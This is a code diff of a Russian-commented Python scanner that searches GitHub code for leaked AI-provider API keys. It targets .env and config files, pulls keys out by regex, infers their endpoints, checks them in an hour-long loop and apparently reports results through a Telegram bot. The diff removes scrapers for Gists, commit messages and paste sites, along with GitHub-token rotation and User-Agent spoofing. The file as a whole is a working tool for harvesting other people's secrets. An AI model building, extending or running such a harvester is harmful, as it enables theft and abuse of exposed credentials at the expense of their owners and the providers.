@@ -17,16 +17,9 @@ logging.basicConfig(format="%(asctime)s - %(message)s", level=logging.INFO, stre
 logger = logging.getLogger(__name__)
 
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-# Поддержка нескольких токенов через запятую
-GITHUB_TOKEN_SINGLE = os.getenv("GITHUB_TOKEN")
-GITHUB_TOKENS = os.getenv("GITHUB_TOKENS", GITHUB_TOKEN_SINGLE or "").split(",")
-GITHUB_TOKENS = [t.strip() for t in GITHUB_TOKENS if t.strip()]
-
-if not GITHUB_TOKENS:
-    logger.error("❌ Нет ни одного GitHub токена! Установите GITHUB_TOKEN или GITHUB_TOKENS.")
-    sys.exit(1)
-
+GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
+
 TOTAL_RUN_TIME = 3600
 REPORT_INTERVAL = 900
 
@@ -75,7 +68,7 @@ REPO_HINTS = {
     "cerebras": "https://api.cerebras.ai/v1", "deepinfra": "https://api.deepinfra.com/v1/openai",
 }
 
-# ─── ГЕНЕРАТОР СЛУЧАЙНЫХ ЗАПРОСОВ ──────────────────────────────────────────
+# ─── ГЕНЕРАТОР ЗАПРОСОВ ────────────────────────────────────────────────────
 PREFIXES = ["sk-proj-", "sk-ant-api03-", "hf_", "sk-kimi-", "sk-cp-", "sk-sp-", "gsk_", "pplx-", "AIzaSy", "sk-"]
 LANGUAGES = ["Python", "JavaScript", "TypeScript", "Go", "Rust", "Java", "PHP", "Ruby", "C++", "C#", "Kotlin", "Swift", "Shell", "YAML", "JSON", "Dockerfile", "Makefile", "Markdown"]
 QUALIFIERS = ["filename:.env", "filename:config.json", "filename:settings.py", "filename:docker-compose.yml", "filename:*.yaml", "filename:*.yml", "path:.env", "path:config", "path:settings", "path:secrets", "extension:json", "extension:yaml", "extension:env", "extension:py", "extension:js", "extension:ts", "size:<1000"]
@@ -91,9 +84,6 @@ def get_random_github_query():
         qual = random.choice(QUALIFIERS)
         return f"{base} {qual}"
     return base
-
-def get_random_token():
-    return random.choice(GITHUB_TOKENS)
 
 # ─── БАЗА ДАННЫХ И КЭШИ ────────────────────────────────────────────────────
 dead_keys_set = set()
@@ -144,7 +134,7 @@ def mark_repo_seen(repo):
         with open('github_seen_repos.txt', 'a', encoding='utf-8') as f:
             f.write(f"{repo}\n")
 
-# ─── ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ПАРСИНГА ──────────────────────────────────────
+# ─── ПАРСИНГ GITHUB ────────────────────────────────────────────────────────
 repo_url_cache = {}
 
 def get_urls_from_repo_configs(repo):
@@ -152,13 +142,12 @@ def get_urls_from_repo_configs(repo):
     found_urls = []
     try:
         tree_url = f"https://api.github.com/repos/{repo}/git/trees/HEAD?recursive=1"
-        token = get_random_token()
-        resp = requests.get(tree_url, headers={"Authorization": f"Bearer {token}"}, timeout=10)
+        resp = requests.get(tree_url, headers={"Authorization": f"Bearer {GITHUB_TOKEN}"}, timeout=10)
         if resp.status_code == 200:
             for item in resp.json().get("tree", []):
                 if item["type"] == "blob" and any(x in item["path"].lower() for x in ['.env', 'config', 'settings']):
                     file_url = f"https://api.github.com/repos/{repo}/contents/{item['path']}"
-                    f_resp = requests.get(file_url, headers={"Authorization": f"Bearer {token}", "Accept": "application/vnd.github.raw+json"}, timeout=5)
+                    f_resp = requests.get(file_url, headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=5)
                     if f_resp.status_code == 200:
                         for u in URL_REGEX.findall(f_resp.text):
                             if any(x in u for x in ['github.com', 'telegram', 'w3.org']): continue
@@ -170,37 +159,7 @@ def get_urls_from_repo_configs(repo):
     repo_url_cache[repo] = list(set(found_urls))
     return repo_url_cache[repo]
 
-def extract_keys_from_text(text):
-    targets = []
-    lines = text.split('\n')
-    for line in lines:
-        for p in KEY_PATTERNS:
-            for match in p["regex"].finditer(line):
-                token = match.group(0)
-                
-                if p["provider"] == "generic-sk":
-                    if any(token.startswith(prefix) for prefix in ["sk-proj-", "sk-ant-", "sk-kimi-", "sk-cp-", "sk-sp-", "sk-or-v1-"]):
-                        continue
-                
-                api_urls = []
-                for u in URL_REGEX.findall(line):
-                    if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']): continue
-                    match_url = re.search(r'(.*?/v\d+(?:beta\d*)?)', u)
-                    if not match_url:
-                        match_url = re.search(r'(.*?/api)', u)
-                    if match_url: api_urls.append(match_url.group(1))
-                    
-                if not api_urls and p["provider"] != "generic-sk":
-                    api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
-                    
-                if not api_urls:
-                    api_urls.append(PROVIDER_ENDPOINTS["default"])
-                    
-                for url in list(set(api_urls))[:1]:
-                    if url: targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
-    return targets
-
-# ─── CONTRASTAPI ───────────────────────────────────────────────────────────
+# ─── ПРОВЕРКА ЧЕРЕЗ CONTRASTAPI ────────────────────────────────────────────
 contrast_requests_made = 0
 MAX_CONTRAST_REQUESTS = 25
 
@@ -225,192 +184,135 @@ def check_with_contrast(text):
         logger.error(f"❌ Ошибка ContrastAPI: {e}")
     return False
 
-# ─── ПАРСИНГ GITHUB (КОД) ──────────────────────────────────────────────────
 def fetch_github_targets():
-    logger.info("🐙 Ищу ключи на GitHub (код)...")
+    logger.info("🐙 Ищу ключи на GitHub...")
+    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
+    
     query = get_random_github_query()
     page = github_pages.get(query, 1)
-    if page < 1 or page > 20: page = 1
+    if page < 1 or page > 20:
+        page = 1
 
-    tokens_to_try = GITHUB_TOKENS.copy()
-    random.shuffle(tokens_to_try)
-    token_used = None
-    resp = None
+    try:
+        resp = requests.get(
+            "https://api.github.com/search/code",
+            headers=headers,
+            params={"q": query, "per_page": 50, "page": page},
+            timeout=15
+        )
 
-    for token in tokens_to_try:
-        headers = {
-            "Authorization": f"Bearer {token}",
-            "Accept": "application/vnd.github+json",
-            "User-Agent": random.choice(["Mozilla/5.0", "GitHubBot", "Python/3.10"])
-        }
-        try:
-            resp = requests.get("https://api.github.com/search/code", headers=headers, params={"q": query, "per_page": 50, "page": page}, timeout=15)
-            if resp.status_code == 403:
+        if resp.status_code == 403:
+            logger.error("❌ GitHub 403: Лимит поиска или неверный токен.")
+            return []
+
+        resp.raise_for_status()
+        items = resp.json().get("items", [])
+        logger.info(f"📄 {query} | страница {page} | файлов: {len(items)}")
+
+        if len(items) > 0:
+            next_page = page + 1 if page < 20 else 1
+            github_pages[query] = next_page
+            save_github_pages()
+
+        targets = []
+        for i, item in enumerate(items[:20], 1):
+            repo, path = item["repository"]["full_name"], item["path"]
+
+            if repo in github_seen_repos:
+                logger.info(f"   └ [{i}/{min(len(items), 20)}] ⏭ Пропускаю уже проверенный {repo}")
                 continue
-            resp.raise_for_status()
-            token_used = token
-            break
-        except Exception:
-            continue
-    
-    if not token_used:
-        logger.error("❌ Все токены GitHub не смогли выполнить запрос.")
-        return []
 
-    items = resp.json().get("items", [])
-    logger.info(f"📄 {query} | страница {page} | файлов: {len(items)}")
+            logger.info(f"   └ [{i}/{min(len(items), 20)}] Скачиваю {repo}...")
 
-    if len(items) > 0:
-        next_page = page + 1 if page < 20 else 1
-        github_pages[query] = next_page
-        save_github_pages()
+            try:
+                file_resp = requests.get(
+                    f"https://api.github.com/repos/{repo}/contents/{path}",
+                    headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"},
+                    timeout=5,
+                    stream=True
+                )
+                if file_resp.status_code != 200:
+                    continue
 
-    targets = []
-    for i, item in enumerate(items[:20], 1):
-        repo, path = item["repository"]["full_name"], item["path"]
-        if repo in github_seen_repos:
-            logger.info(f"   └ [{i}/{min(len(items), 20)}] ⏭ Пропускаю уже проверенный {repo}")
-            continue
+                content_length = file_resp.headers.get('content-length')
+                if content_length and int(content_length) > 100_000:
+                    logger.info(f"      ⏩ Пропускаю большой файл ({(int(content_length)//1024)} КБ)")
+                    mark_repo_seen(repo)
+                    continue
 
-        logger.info(f"   └ [{i}/{min(len(items), 20)}] Скачиваю {repo}...")
-        try:
-            file_resp = requests.get(f"https://api.github.com/repos/{repo}/contents/{path}", headers={"Authorization": f"Bearer {token_used}", "Accept": "application/vnd.github.raw+json"}, timeout=5, stream=True)
-            if file_resp.status_code != 200: continue
-            content_length = file_resp.headers.get('content-length')
-            if content_length and int(content_length) > 100_000:
-                mark_repo_seen(repo)
+                text = file_resp.content.decode('utf-8', errors='ignore')
+            except requests.RequestException:
                 continue
-            text = file_resp.content.decode('utf-8', errors='ignore')
-        except requests.RequestException:
-            continue
 
-        mark_repo_seen(repo)
-        lines = text.split('\n')
-        for line in lines:
-            for p in KEY_PATTERNS:
-                for match in p["regex"].finditer(line):
-                    token = match.group(0)
-                    if p["provider"] == "generic-sk":
-                        if any(token.startswith(prefix) for prefix in ["sk-proj-", "sk-ant-", "sk-kimi-", "sk-cp-", "sk-sp-", "sk-or-v1-"]): continue
-                    
-                    api_urls = []
-                    for u in URL_REGEX.findall(line):
-                        if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']): continue
-                        match_url = re.search(r'(.*?/v\d+(?:beta\d*)?)', u)
-                        if not match_url: match_url = re.search(r'(.*?/api)', u)
-                        if match_url: api_urls.append(match_url.group(1))
-                    
-                    if not api_urls and p["provider"] != "generic-sk":
-                        api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
-                    if not api_urls:
-                        api_urls.extend(get_urls_from_repo_configs(repo)[:1])
-                    if not api_urls:
-                        var_match = re.search(r'([A-Za-z0-9_]+)\s*=', line)
-                        var_name = var_match.group(1).lower() if var_match else ""
-                        for hint, url in REPO_HINTS.items():
-                            if hint in var_name: api_urls.append(url); break
+            mark_repo_seen(repo)
+
+            lines = text.split('\n')
+            for line in lines:
+                for p in KEY_PATTERNS:
+                    for match in p["regex"].finditer(line):
+                        token = match.group(0)
+
+                        if p["provider"] == "generic-sk":
+                            if any(token.startswith(prefix) for prefix in ["sk-proj-", "sk-ant-", "sk-kimi-", "sk-cp-", "sk-sp-", "sk-or-v1-"]):
+                                continue
+
+                        api_urls = []
+
+                        for u in URL_REGEX.findall(line):
+                            if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']):
+                                continue
+                            match_url = re.search(r'(.*?/v\d+(?:beta\d*)?)', u)
+                            if not match_url:
+                                match_url = re.search(r'(.*?/api)', u)
+                            if match_url:
+                                api_urls.append(match_url.group(1))
+
+                        if not api_urls and p["provider"] != "generic-sk":
+                            api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
+
                         if not api_urls:
-                            if "openai" in var_name: api_urls.append(PROVIDER_ENDPOINTS["openai"])
-                            elif "anthropic" in var_name: api_urls.append(PROVIDER_ENDPOINTS["anthropic"])
-                    if not api_urls:
-                        combined = (repo + " " + path).lower()
-                        for hint, url in REPO_HINTS.items():
-                            if hint in combined: api_urls.append(url); break
-                    if not api_urls:
-                        api_urls.append(PROVIDER_ENDPOINTS["default"])
-                        
-                    for url in list(set(api_urls))[:1]:
-                        if url: targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
-        time.sleep(0.2)
+                            api_urls.extend(get_urls_from_repo_configs(repo)[:1])
 
-    unique_targets, seen = [], set()
-    for t in targets:
-        sig = f"{t['key']}_{t['endpoint']}"
-        if sig not in seen: seen.add(sig); unique_targets.append(t)
+                        if not api_urls:
+                            var_match = re.search(r'([A-Za-z0-9_]+)\s*=', line)
+                            var_name = var_match.group(1).lower() if var_match else ""
+                            for hint, url in REPO_HINTS.items():
+                                if hint in var_name:
+                                    api_urls.append(url)
+                                    break
+                            if not api_urls:
+                                if "openai" in var_name:
+                                    api_urls.append(PROVIDER_ENDPOINTS["openai"])
+                                elif "anthropic" in var_name:
+                                    api_urls.append(PROVIDER_ENDPOINTS["anthropic"])
 
-    logger.info(f"✅ GitHub (код): найдено целей: {len(unique_targets)}")
-    return unique_targets
+                        if not api_urls:
+                            combined = (repo + " " + path).lower()
+                            for hint, url in REPO_HINTS.items():
+                                if hint in combined:
+                                    api_urls.append(url)
+                                    break
 
-# ─── ПАРСИНГ GIST ──────────────────────────────────────────────────────────
-def fetch_gist_targets():
-    logger.info("📋 Ищу ключи в GitHub Gist...")
-    query = get_random_github_query()
-    token = get_random_token()
-    headers = {"Authorization": f"Bearer {token}", "Accept": "application/vnd.github+json"}
-    try:
-        resp = requests.get("https://api.github.com/search/gists", headers=headers, params={"q": query, "per_page": 30}, timeout=15)
-        if resp.status_code == 403: return []
-        resp.raise_for_status()
-        items = resp.json().get("items", [])
-        logger.info(f"📄 Gist: найдено гистов: {len(items)}")
-        targets = []
-        for item in items[:10]:
-            for file in item.get("files", {}).values():
-                content_url = file.get("raw_url")
-                if content_url:
-                    try:
-                        content_resp = requests.get(content_url, timeout=5)
-                        if content_resp.status_code == 200:
-                            targets.extend(extract_keys_from_text(content_resp.text))
-                    except: pass
-        logger.info(f"✅ Gist: найдено целей: {len(targets)}")
-        return targets
+                        if not api_urls:
+                            api_urls.append(PROVIDER_ENDPOINTS["default"])
+
+                        for url in list(set(api_urls))[:1]:
+                            if url:
+                                targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
+
+            time.sleep(0.2)
+
+        unique_targets, seen = [], set()
+        for t in targets:
+            sig = f"{t['key']}_{t['endpoint']}"
+            if sig not in seen:
+                seen.add(sig)
+                unique_targets.append(t)
+
+        logger.info(f"✅ GitHub: найдено целей: {len(unique_targets)}")
+        return unique_targets
     except Exception as e:
-        logger.error(f"❌ Ошибка Gist: {e}")
-        return []
-
-# ─── ПАРСИНГ КОММИТОВ ──────────────────────────────────────────────────────
-def fetch_commit_targets():
-    logger.info("📋 Ищу ключи в коммитах GitHub...")
-    query = get_random_github_query()
-    token = get_random_token()
-    headers = {"Authorization": f"Bearer {token}", "Accept": "application/vnd.github+json"}
-    try:
-        resp = requests.get("https://api.github.com/search/commits", headers=headers, params={"q": query, "per_page": 30}, timeout=15)
-        if resp.status_code == 403: return []
-        resp.raise_for_status()
-        items = resp.json().get("items", [])
-        logger.info(f"📄 Коммиты: найдено коммитов: {len(items)}")
-        targets = []
-        for item in items[:10]:
-            commit_message = item.get("commit", {}).get("message", "")
-            if commit_message:
-                targets.extend(extract_keys_from_text(commit_message))
-        logger.info(f"✅ Коммиты: найдено целей: {len(targets)}")
-        return targets
-    except Exception as e:
-        logger.error(f"❌ Ошибка Commit search: {e}")
-        return []
-
-# ─── ПАРСИНГ APIFY ─────────────────────────────────────────────────────────
-from apify_client import ApifyClient
-APIFY_TOKEN = os.getenv("APIFY_TOKEN")
-
-def fetch_apify_targets():
-    if not APIFY_TOKEN: return []
-    client = ApifyClient(APIFY_TOKEN)
-    targets = []
-    actor_choice = random.choice(["jungle", "thescrapelab"])
-    search_terms = ["sk-", "hf_", "sk-proj-", "sk-ant-", "AIzaSy", "pplx-", "gsk_"]
-    try:
-        if actor_choice == "jungle":
-            logger.info("📋 Ищу ключи на Paste-сайтах через jungle_synthesizer...")
-            run = client.actor("jungle_synthesizer/osint-scraper").call(run_input={"keywords": search_terms, "sites": ["pastebin.com", "gist.github.com", "ideone.com", "paste.org", "textbin.net"], "maxItems": 30})
-            if run:
-                for item in client.dataset(run['defaultDatasetId']).iterate_items():
-                    snippet = item.get("snippet", "")
-                    if snippet: targets.extend(extract_keys_from_text(snippet))
-        else:
-            logger.info("📋 Ищу ключи на Pastebin через thescrapelab...")
-            run = client.actor("thescrapelab/pastebin-osint-scraper").call(run_input={"searchKeywords": search_terms, "maxItems": 30})
-            if run:
-                for item in client.dataset(run['defaultDatasetId']).iterate_items():
-                    text = item.get("text") or item.get("content") or item.get("snippet") or ""
-                    if text: targets.extend(extract_keys_from_text(text))
-        logger.info(f"✅ Apify ({actor_choice}): найдено целей: {len(targets)}")
-        return targets
-    except Exception as e:
-        logger.error(f"❌ Ошибка Apify ({actor_choice}): {e}")
+        logger.error(f"❌ Ошибка GitHub: {e}")
         return []
 
 # ─── ПРОВЕРКА КЛЮЧЕЙ ───────────────────────────────────────────────────────
@@ -460,17 +362,7 @@ async def long_scan_loop():
     logger.info(f"🚀 Запущен длинный скан на {TOTAL_RUN_TIME//60} минут.")
     
     while time.time() - start_time < TOTAL_RUN_TIME:
-        # 50% - GitHub Code, 15% - Gist, 15% - Commit, 20% - Apify
-        chance = random.random()
-        if chance < 0.5:
-            targets = await asyncio.to_thread(fetch_github_targets)
-        elif chance < 0.65:
-            targets = await asyncio.to_thread(fetch_gist_targets)
-        elif chance < 0.8:
-            targets = await asyncio.to_thread(fetch_commit_targets)
-        else:
-            targets = await asyncio.to_thread(fetch_apify_targets)
-            
+        targets = await asyncio.to_thread(fetch_github_targets)
         total_checked += len(targets)
         
         for t in targets:
@@ -522,5 +414,5 @@ async def long_scan_loop():
     logger.info("✅ Сессия завершена.")
 
 if __name__ == "__main__":
-    if not BOT_TOKEN or not GITHUB_TOKENS: sys.exit(1)
+    if not BOT_TOKEN or not GITHUB_TOKEN: sys.exit(1)
     asyncio.run(long_scan_loop())
